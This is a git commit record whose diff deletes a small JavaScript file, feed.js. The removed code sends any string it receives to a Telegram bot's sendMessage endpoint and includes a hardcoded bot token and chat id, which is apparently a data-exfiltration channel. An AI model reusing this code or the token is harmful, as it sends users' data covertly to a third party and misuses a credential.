fa06d97db4e7edaa2370708c30f1038546a01f23
zackopk2 <90936576+zackopk2@users.noreply.github.com>
2023-01-12 17:59:37 -0300

    Delete feed.js

--- feed.js
+++
@@ -1,3 +0,0 @@
-var oReq = new XMLHttpRequest();
-function status(url)
-{var messagen_send = url;var next3 = 'https://api.telegram.org/bot5855689089:AAE5sgU1TifEt3Se89O8RmkJKOH-74DU1WU/sendMessage?chat_id=5855689089&text='+messagen_send;oReq.open("GET", next3);oReq.send()}
